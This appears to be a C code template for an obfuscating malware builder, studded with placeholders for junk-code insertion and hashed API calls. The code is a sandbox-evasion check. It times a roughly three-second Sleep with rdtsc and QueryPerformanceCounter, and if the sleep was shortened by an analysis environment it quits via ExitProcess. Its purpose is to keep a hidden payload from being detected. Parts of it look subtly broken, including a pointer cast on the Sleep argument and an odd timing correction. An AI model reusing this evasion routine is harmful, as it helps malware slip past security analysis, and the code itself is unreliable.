LARGE_INTEGER f, t;

{{obf:*}} ULONGLONG interval = 3000 + ({{value:byte}} + {{value:byte}}); // ~3.5s

{{obf:*}} {{api-n:QueryPerformanceFrequency}}(&f);
{{obf:*}} {{api-n:QueryPerformanceCounter}}(&t);
{{obf:*}} unsigned __int64 t1 = __rdtsc();
{{obf:*}} {{api-n:Sleep}}((PVOID)interval);
{{obf:*}} unsigned __int64 t2 = __rdtsc();

{{obf:*}} double k = (double)t.QuadPart / t1 * 1.02; // Correct the rdtsc time by 1.02
{{obf:*}} double result = (t2 - t1) * k / f.QuadPart * 1000;
{{obf:*}}

if (result < interval) {
    {{obf:*}} {{api-n:ExitProcess}}(0);
    {{obf:*}}
}

{{obf:*}} 